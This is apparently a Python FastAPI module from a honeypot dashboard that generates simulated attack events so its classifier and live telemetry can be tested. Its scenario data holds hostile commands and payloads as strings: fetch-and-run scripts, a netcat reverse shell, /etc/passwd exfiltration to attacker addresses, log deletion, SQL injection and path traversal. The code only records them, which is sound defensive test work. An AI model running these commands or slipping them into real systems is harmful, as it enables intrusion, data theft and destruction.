"""
Interactive Attack Simulation API.
Allows triggering simulated attack scenarios directly from the dashboard or test runners
to demonstrate real-time classification, risk scoring, and live WebSocket telemetry.
"""
from typing import Dict, Any
import random
import uuid
from datetime import datetime
from fastapi import APIRouter, Depends
from sqlalchemy.orm import Session

from ..database import get_db
from ..models import HoneypotEvent
from ..classifier import classify_event
from ..geoip import resolve_ip_geo
from ..ws_manager import ws_manager

router = APIRouter(prefix="/api/simulator", tags=["simulator"])

SCENARIOS = {
    "ssh_bruteforce": {
        "service": "SSH",
        "event_type": "LOGIN_ATTEMPT",
        "usernames": ["root", "admin", "ubuntu", "oracle", "support", "deploy"],
        "passwords": ["123456", "password", "admin123", "toor", "root2026", "qwerty"],
        "ips": ["198.51.100.45", "203.0.113.19", "185.220.101.5", "45.155.205.233"],
    },
    "command_injection": {
        "service": "SSH",
        "event_type": "COMMAND_EXEC",
        "commands": [
            "wget http://185.220.101.5/bot.sh -O /tmp/bot.sh; chmod +x /tmp/bot.sh; /tmp/bot.sh",
            "curl -fsSL http://evil-payloads.org/miner.sh | bash",
            "cat /etc/passwd | mail -s 'stolen' attacker@darkweb.net",
            "nc -e /bin/sh 198.51.100.45 4444",
            "rm -rf /var/log/* && uname -a",
            "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')\""
        ],
        "ips": ["45.33.32.156", "185.220.101.5", "194.26.29.112"],
    },
    "web_sqli": {
        "service": "HTTP",
        "event_type": "WEB_REQUEST",
        "payloads": [
            "admin' OR '1'='1' --",
            "1' UNION SELECT null, username, password FROM users --",
            "'; DROP TABLE sessions; --",
            "' UNION SELECT @@version, user(), database() --",
            "1' AND SLEEP(5) --"
        ],
        "paths": ["/admin/login", "/api/v1/users?id=", "/wp-login.php", "/api/products?cat="],
        "ips": ["185.191.171.12", "195.154.122.90", "103.208.220.14"],
    },
    "botnet_recon": {
        "service": "HTTP",
        "event_type": "WEB_REQUEST",
        "user_agents": [
            "Mozilla/5.0 (compatible; Nikto/2.1.6; +http://cirt.net/nikto/)",
            "sqlmap/1.5.2#stable (http://sqlmap.org)",
            "Masscan/1.0 (https://github.com/robertdavidgraham/masscan)",
            "Nmap Scripting Engine (https://nmap.org/book/nse.html)",
            "Mozilla/5.0 (zgrab/0.x; +https://zmap.io)",
            "python-requests/2.28.1 (DarkBot/1.0)",
            "Go-http-client/1.1 (CensysInspect/1.1)"
        ],
        "paths": ["/.env", "/actuator/env", "/wp-config.php", "/.git/config", "/config.json", "/phpinfo.php", "/shell.php"],
        "ips": ["89.248.165.74", "198.51.100.99", "185.220.102.8"],
    },
    "path_traversal": {
        "service": "HTTP",
        "event_type": "WEB_REQUEST",
        "payloads": [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../../var/log/auth.log",
            "../../../../.env"
        ],
        "paths": ["/api/v1/files/download?path=", "/view?file=", "/download?doc="],
        "ips": ["178.62.204.101", "104.244.78.210", "193.106.191.66"],
    }
}

@router.post("/trigger")
async def trigger_simulation(scenario: str = "all", db: Session = Depends(get_db)):
    """
    Trigger one or all simulated attack scenarios.
    Useful for testing the dashboard and demonstrating detection in action.
    """
    created_events = []
    
    scenarios_to_run = list(SCENARIOS.keys()) if scenario == "all" else [scenario]
    
    for sc_name in scenarios_to_run:
        sc = SCENARIOS.get(sc_name)
        if not sc:
            continue
            
        session_id = str(uuid.uuid4())[:8]
        
        if sc_name == "ssh_bruteforce":
            # Generate 4-6 fast attempts from same IP
            ip = random.choice(sc["ips"])
            for _ in range(random.randint(4, 7)):
                u = random.choice(sc["usernames"])
                p = random.choice(sc["passwords"])
                ev_data = {
                    "source_ip": ip,
                    "source_port": random.randint(30000, 60000),
                    "service": "SSH",
                    "event_type": "LOGIN_ATTEMPT",
                    "username": u,
                    "password": p,
                    "payload": f"LOGIN_FAILED user={u} pass={p}",
                    "user_agent": "SSH-2.0-libssh_0.9.5",
                    "session_id": session_id,
                }
                classification_res = classify_event(ev_data, db=db)
                geo_res = resolve_ip_geo(ip)
                db_event = HoneypotEvent(
                    timestamp=datetime.utcnow(),
                    source_ip=ip,
                    source_port=ev_data["source_port"],
                    service="SSH",
                    event_type="LOGIN_ATTEMPT",
                    username=u,
                    password=p,
                    payload=ev_data["payload"],
                    user_agent=ev_data["user_agent"],
                    session_id=session_id,
                    classification=classification_res["classification"],
                    risk_score=classification_res["risk_score"],
                    risk_level=classification_res["risk_level"],
                    matched_rule=classification_res["matched_rule"],
                    geo_country=geo_res.get("country", "Unknown"),
                    geo_country_code=geo_res.get("country_code", "XX"),
                    geo_city=geo_res.get("city", "Unknown"),
                    geo_lat=geo_res.get("lat"),
                    geo_lon=geo_res.get("lon"),
                    geo_org=geo_res.get("org", "Unknown"),
                )
                db.add(db_event)
                db.commit()
                db.refresh(db_event)
                event_dict = db_event.to_dict()
                await ws_manager.broadcast_event(event_dict)
                created_events.append(event_dict)
                
        elif sc_name == "command_injection":
            ip = random.choice(sc["ips"])
            cmd = random.choice(sc["commands"])
            ev_data = {
                "source_ip": ip,
                "source_port": random.randint(30000, 60000),
                "service": "SSH",
                "event_type": "COMMAND_EXEC",
                "username": "root",
                "payload": cmd,
                "user_agent": "SSH-2.0-OpenSSH_8.2p1",
                "session_id": session_id,
            }
            classification_res = classify_event(ev_data, db=db)
            geo_res = resolve_ip_geo(ip)
            db_event = HoneypotEvent(
                timestamp=datetime.utcnow(),
                source_ip=ip,
                source_port=ev_data["source_port"],
                service="SSH",
                event_type="COMMAND_EXEC",
                username="root",
                payload=cmd,
                user_agent=ev_data["user_agent"],
                session_id=session_id,
                classification=classification_res["classification"],
                risk_score=classification_res["risk_score"],
                risk_level=classification_res["risk_level"],
                matched_rule=classification_res["matched_rule"],
                geo_country=geo_res.get("country", "Unknown"),
                geo_country_code=geo_res.get("country_code", "XX"),
                geo_city=geo_res.get("city", "Unknown"),
                geo_lat=geo_res.get("lat"),
                geo_lon=geo_res.get("lon"),
                geo_org=geo_res.get("org", "Unknown"),
            )
            db.add(db_event)
            db.commit()
            db.refresh(db_event)
            event_dict = db_event.to_dict()
            await ws_manager.broadcast_event(event_dict)
            created_events.append(event_dict)

        elif sc_name == "web_sqli":
            ip = random.choice(sc["ips"])
            payload = random.choice(sc["payloads"])
            path = random.choice(sc["paths"])
            ev_data = {
                "source_ip": ip,
                "source_port": random.randint(30000, 60000),
                "service": "HTTP",
                "event_type": "WEB_REQUEST",
                "username": "admin",
                "password": payload if "login" in path else None,
                "payload": f"POST {path} query={payload}",
                "path": path,
                "request_method": "POST",
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "session_id": session_id,
            }
            classification_res = classify_event(ev_data, db=db)
            geo_res = resolve_ip_geo(ip)
            db_event = HoneypotEvent(
                timestamp=datetime.utcnow(),
                source_ip=ip,
                source_port=ev_data["source_port"],
                service="HTTP",
                event_type="WEB_REQUEST",
                username="admin",
                password=payload if "login" in path else None,
                payload=ev_data["payload"],
                path=path,
                request_method="POST",
                user_agent=ev_data["user_agent"],
                session_id=session_id,
                classification=classification_res["classification"],
                risk_score=classification_res["risk_score"],
                risk_level=classification_res["risk_level"],
                matched_rule=classification_res["matched_rule"],
                geo_country=geo_res.get("country", "Unknown"),
                geo_country_code=geo_res.get("country_code", "XX"),
                geo_city=geo_res.get("city", "Unknown"),
                geo_lat=geo_res.get("lat"),
                geo_lon=geo_res.get("lon"),
                geo_org=geo_res.get("org", "Unknown"),
            )
            db.add(db_event)
            db.commit()
            db.refresh(db_event)
            event_dict = db_event.to_dict()
            await ws_manager.broadcast_event(event_dict)
            created_events.append(event_dict)

        elif sc_name == "botnet_recon":
            ip = random.choice(sc["ips"])
            ua = random.choice(sc["user_agents"])
            path = random.choice(sc["paths"])
            ev_data = {
                "source_ip": ip,
                "source_port": random.randint(30000, 60000),
                "service": "HTTP",
                "event_type": "WEB_REQUEST",
                "payload": f"GET {path} HTTP/1.1",
                "path": path,
                "request_method": "GET",
                "user_agent": ua,
                "session_id": session_id,
            }
            classification_res = classify_event(ev_data, db=db)
            geo_res = resolve_ip_geo(ip)
            db_event = HoneypotEvent(
                timestamp=datetime.utcnow(),
                source_ip=ip,
                source_port=ev_data["source_port"],
                service="HTTP",
                event_type="WEB_REQUEST",
                payload=ev_data["payload"],
                path=path,
                request_method="GET",
                user_agent=ua,
                session_id=session_id,
                classification=classification_res["classification"],
                risk_score=classification_res["risk_score"],
                risk_level=classification_res["risk_level"],
                matched_rule=classification_res["matched_rule"],
                geo_country=geo_res.get("country", "Unknown"),
                geo_country_code=geo_res.get("country_code", "XX"),
                geo_city=geo_res.get("city", "Unknown"),
                geo_lat=geo_res.get("lat"),
                geo_lon=geo_res.get("lon"),
                geo_org=geo_res.get("org", "Unknown"),
            )
            db.add(db_event)
            db.commit()
            db.refresh(db_event)
            event_dict = db_event.to_dict()
            await ws_manager.broadcast_event(event_dict)
            created_events.append(event_dict)

        elif sc_name == "path_traversal":
            ip = random.choice(sc["ips"])
            payload = random.choice(sc["payloads"])
            path_prefix = random.choice(sc["paths"])
            full_path = f"{path_prefix}{payload}"
            ev_data = {
                "source_ip": ip,
                "source_port": random.randint(30000, 60000),
                "service": "HTTP",
                "event_type": "WEB_REQUEST",
                "payload": f"GET {full_path} HTTP/1.1",
                "path": full_path,
                "request_method": "GET",
                "user_agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "session_id": session_id,
            }
            classification_res = classify_event(ev_data, db=db)
            geo_res = resolve_ip_geo(ip)
            db_event = HoneypotEvent(
                timestamp=datetime.utcnow(),
                source_ip=ip,
                source_port=ev_data["source_port"],
                service="HTTP",
                event_type="WEB_REQUEST",
                payload=ev_data["payload"],
                path=full_path,
                request_method="GET",
                user_agent=ev_data["user_agent"],
                session_id=session_id,
                classification=classification_res["classification"],
                risk_score=classification_res["risk_score"],
                risk_level=classification_res["risk_level"],
                matched_rule=classification_res["matched_rule"],
                geo_country=geo_res.get("country", "Unknown"),
                geo_country_code=geo_res.get("country_code", "XX"),
                geo_city=geo_res.get("city", "Unknown"),
                geo_lat=geo_res.get("lat"),
                geo_lon=geo_res.get("lon"),
                geo_org=geo_res.get("org", "Unknown"),
            )
            db.add(db_event)
            db.commit()
            db.refresh(db_event)
            event_dict = db_event.to_dict()
            await ws_manager.broadcast_event(event_dict)
            created_events.append(event_dict)

    return {
        "status": "success",
        "scenario": scenario,
        "events_generated": len(created_events),
        "events": created_events
    }
